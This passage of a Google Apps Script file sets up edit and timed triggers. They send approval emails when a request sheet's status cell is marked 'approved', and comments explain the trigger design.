          ', skus ' + d.skus.length + ', thumbs ' + d.thumbs.length;
  } catch (err) {
    msg = 'NOT READABLE -- ' + (err && err.message || err);
  }
  Logger.log(msg);
  return msg;
}

/* ------------------------------------------------------------- triggers */

/* Run this ONCE, from the editor. After it, approving somebody is a single
   cell edit in the workbook and nothing else: no editor, no Run button.
 *
 * Two triggers, on purpose:
 *
 *   the edit trigger   fires the moment a status cell becomes "approved",
 *                      so the link goes out in seconds while the person is
 *                      still standing at the booth.
 *   the five-minute    a net under it. An edit trigger does not fire for
 *   timer              every way a cell can change -- a paste over a block,
 *                      a fill-down, an edit made from the mobile app or
 *                      while offline and synced later. Any of those would
 *                      leave somebody approved and never told. The timer
 *                      catches them, at the cost of a few minutes.
 *
 * Both call the same locked sendApprovals, so the overlap is harmless.
 *
 * These must be INSTALLABLE triggers. A simple onEdit(e) runs without
 * authorisation and cannot send mail at all, which would look like the
 * feature silently not working.
 */
function installTriggers() {
  removeTriggers();
  ScriptApp.newTrigger('onSheetEdit').forSpreadsheet(SHEET_ID).onEdit().create();
  ScriptApp.newTrigger('sendApprovals').timeBased().everyMinutes(5).create();
  return 'Installed. Set a status cell to "approved" and the mail goes out by itself.';
}

/* Re-running installTriggers must not leave two of each: triggers stack
   silently, and four copies means four runs racing for the same row. */
function removeTriggers() {
  var all = ScriptApp.getProjectTriggers(), n = 0;
  for (var i = 0; i < all.length; i++) {
    var fn = all[i].getHandlerFunction();
    if (fn === 'onSheetEdit' || fn === 'sendApprovals') {
      ScriptApp.deleteTrigger(all[i]);
      n++;
    }
  }
  return 'Removed ' + n + ' trigger(s).';
}

/* Fires on every edit anywhere in the workbook, the Scores tab included, so
   it has to be narrow: the request tab, the status column, and a value that
   actually says approved. Anything else returns without touching a thing. */
function onSheetEdit(e) {
  try {
    if (!e || !e.range) return;
    if (e.range.getSheet().getName() !== REQ_TAB) return;
    if (e.range.getColumn() !== 5) return;                   /* status */
    if (e.range.getRow() < 2) return;                        /* the header */
    if (String(e.value || '').trim().toLowerCase() !== 'approved') return;
    sendApprovals();
  } catch (err) {
    Logger.log('onSheetEdit: ' + (err && err.message || err));
  }
}
